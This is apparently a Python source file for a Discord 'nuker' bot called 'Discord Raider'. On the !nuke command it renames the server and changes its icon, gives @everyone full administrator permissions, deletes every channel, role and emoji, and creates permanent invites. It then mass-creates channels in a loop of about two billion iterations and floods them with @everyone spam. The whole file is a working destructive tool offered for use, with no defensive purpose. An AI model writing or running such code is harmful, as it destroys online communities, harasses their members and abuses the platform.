import os
from os import system
import random
try:
  import discord
  from discord.ext import commands
  from discord import Permissions
except:
  os.system("pip install discord.py==1.7.3")
  import discord
  from discord.ext import commands
  from discord import Permissions
try:
  import colorama
  from colorama import Fore, Style
except:
  os.system("pip install colorama")
  import colorama
  from colorama import Fore, Style
try:
  import asyncio
except:
  os.system("pip install asyncio")
  import asyncio
clear = lambda: os.system('cls')
clear()
title = f'Discord Raider'
system(f'title {title}')
token_nuke = input(f"Nuker Bot token : ")
name_user  = input(f"\nPut the nickname and hashtag of your discord account : ")
spam__channel = input(f"\nPut the name of the Channel that will be spam : ")
spam__message = input(f"\nPut the name of the message that will be spam : ")
bot_activitie = input(f"\nBot activities : ")
nuked_server_name =  input(f"\nnuked server name : ")
token = f"{token_nuke}"

SPAM_CHANNEL =  [f"{spam__channel}"]
SPAM_MESSAGE = [f"@everyone {spam__message}"]

client = commands.Bot(command_prefix="!", help_command=None, intents = discord.Intents.all())
clear = lambda: os.system('cls')
clear()
@client.event
async def on_ready():
  print(f"""
Please check that you have activated all Privileged Gateway Intents in the discord portal otherwise the bot will not work

nuke commands : | !nuke | !name | !icon |

other commands : | !serverinfo |
 """)
  await client.change_presence(activity=discord.Game(name=f"{bot_activitie}"))

@client.command()
async def serverinfo(ctx):
  await ctx.message.delete()
  channels = client.get_all_channels()
  server = ctx.guild
  textchannelsnombre = len(server.text_channels)
  voicechannelsnombre = len(server.voice_channels)
  serverdesc = server.description
  serverpersonne = server.member_count
  servername = server.name
  print (f"The server {servername} has {serverpersonne} members and {textchannelsnombre} text channels and {voicechannelsnombre} voice channels its description is {serverdesc}")

@client.command()
async def icon(ctx):
  guild = ctx.guild
  await ctx.message.delete()
  with open('giphy.gif', 'rb') as f:
      icon = f.read()
      await ctx.guild.edit(icon=icon)
      print("the server icon has been changed to NUKED")


@client.command()
async def name(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await ctx.guild.edit(name=f"{nuked_server_name}")
  print ("the server name has been changed to NUKED")

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    await ctx.guild.edit(name=f"{nuked_server_name}")
    print (f"the server name has been changed to {nuked_server_name}")
    with open('giphy.gif', 'rb') as f:
      icon = f.read()
      await ctx.guild.edit(icon=icon)
      print("the server icon has been changed to Atomic Bomb")
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print("now everyone is an admin")
    except:
      print("I didn't manage to put all the admin")
    for channel in guild.channels:
      try:
        await channel.delete()
        print(f"{channel.name} has been removed.")
      except:
        print(f"{channel.name} has not been deleted.")
    for role in guild.roles:
     try:
       await role.delete()
       print(f"{role.name} has been deleted")
     except:
       print(f"{role.name} has not been deleted")
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(f"{emoji.name} has been deleted")
     except:
       print(f"{emoji.name} has not been deleted")
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban(f"{name_user}")
        print(f"{user.name}#{user.discriminator} has been debunked.")
      except:
        print(f"{user.name}#{user.discriminator} has not been debaned.")
    await guild.create_text_channel(f"{spam__channel}")
    await guild.create_voice_channel(f"{spam__channel}")
    for channel in guild.text_channels:
      link = await channel.create_invite(max_age = 0, max_uses = 0)
      print(f"new link : {link}")
    amount = 2147483555
    for i in range(amount):
                await guild.create_text_channel(random.choice(SPAM_CHANNEL))
                print(f"{guild.name} Get NUKED !!!")
                @client.event
                async def on_guild_channel_create(channel):
                  while True:
                    await channel.send(random.choice(SPAM_MESSAGE))

client.run(token, bot=True)